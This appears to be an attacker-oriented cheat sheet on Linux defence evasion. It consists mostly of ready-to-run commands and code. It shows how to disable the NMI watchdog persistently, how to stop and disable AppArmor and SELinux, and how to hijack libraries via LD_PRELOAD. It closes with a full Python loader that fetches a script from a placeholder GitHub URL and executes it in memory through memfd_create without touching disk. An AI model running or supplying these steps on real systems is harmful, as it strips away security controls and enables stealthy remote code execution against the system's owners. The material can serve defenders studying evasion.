# Linux Evasive Techniques:

## Disabling Interrupts:

Attackers also used the commands to disable non-maskable Interrupt(nmi).Watchdog is
basically a configurable timer mechanism which generates interrupt at a particular given
condition and time.In case of the system freeze, the nmi watchdog interrupt handler would
kill the task which is responsible for the system freeze.To evade this defense mechanism,
attackers disable watchdog feature using sysctl command or temporarily disabling it by
setting the value to ‘0’.

Check Current Watchdog Settings:

```
sysctl -a | grep watchdog
```

Disable Watchdog:

```
sudo sysctl kernel.watchdog=0
echo '0' > /proc/sys/kernel/nmi_watchdog
echo "kernel.watchdog=0" | sudo tee -a /etc/sysctl.conf
```

## Disabling Linux Security Modules:

The malicious shell script also disables Linux security modules like SElinux, Apparmor.
These modules are designed to implement mandatory access control(MAC) policies. A server
administrator could simply configure these modules to provide the users restricted access to
the installed or running applications in the system.

---

AppArmour is a security feature in linux which is used to lock down applications like firefox
for increased security. A user can restrict an application in Ubuntu’s default configuration by
giving limited permission to a certain application.

```
sudo systemctl stop apparmor
sudo systemctl disable apparmor
service apparmor stop
```

SElinux is another security feature in linux systems by which a security administrator could
apply security context on certain applications and utilities. On some web servers the shell is
disabled or restricted so for RCE(Remote Code Execution) adversaries usually bypass/disable
this:

```
setenforce 0
echo SELINUX=disabled > /etc/selinux/config
```

## Hijacking Libraries with `LD_PRELOAD`

The `LD_PRELOAD` environment variable allows attackers to load a malicious shared object (SO) file before any other library during program execution. This can be used to override system functions, such as `malloc()`, with custom implementations, enabling malicious behavior.

For example, to execute the `ls` command with a custom implementation of `malloc()`, an attacker would run:

```sh
LD_PRELOAD=/path/to/my/malloc.so /bin/ls
```

In this case, `/path/to/my/malloc.so` is a custom shared object that will replace the default implementation of `malloc()` (or any other overridden functions). This technique is commonly used for data exfiltration, logging sensitive information, or bypassing security mechanisms.

## Using Syscall() for Obfuscation/Fileless Activity

This script downloads content from a GitHub raw URL, writes it to an in-memory file descriptor created with `memfd_create`, reads it back, and executes it as Python code. The entire process happens in RAM without any filesystem operations.

```python
import ctypes
import os
import urllib.request

# Load libc and get syscall function
libc = ctypes.CDLL(None)
syscall = libc.syscall

# memfd_create syscall number (319 on x86_64)
SYS_MEMFD_CREATE = 319
MFD_CLOEXEC = 1

def download_and_execute_from_github(github_raw_url):
    """
    Download a Python script from GitHub and execute it in memory
    without writing to disk.
    """
    # Download the script content
    print(f"Downloading from {github_raw_url}")
    with urllib.request.urlopen(github_raw_url) as response:
        script_content = response.read()
    
    # Create an anonymous file in memory
    fd = syscall(SYS_MEMFD_CREATE, b"", MFD_CLOEXEC)
    if fd < 0:
        raise OSError("memfd_create failed")
    
    print(f"Created memfd with fd={fd}")
    
    # Write the downloaded content to the memory file
    os.write(fd, script_content)
    
    # Seek back to the beginning to read it
    os.lseek(fd, 0, os.SEEK_SET)
    
    # Read the content back
    code_bytes = os.read(fd, len(script_content))
    
    # Close the fd since we've read what we need
    os.close(fd)
    
    # Compile and execute the Python code
    code_string = code_bytes.decode('utf-8')
    compiled_code = compile(code_string, '<memfd>', 'exec')
    
    print("Executing downloaded script...")
    exec(compiled_code)

if __name__ == "__main__":
    # Replace this with your actual GitHub raw URL
    github_url = "https://raw.githubusercontent.com/username/repo/main/script.py"
        
    download_and_execute_from_github(github_url)
```
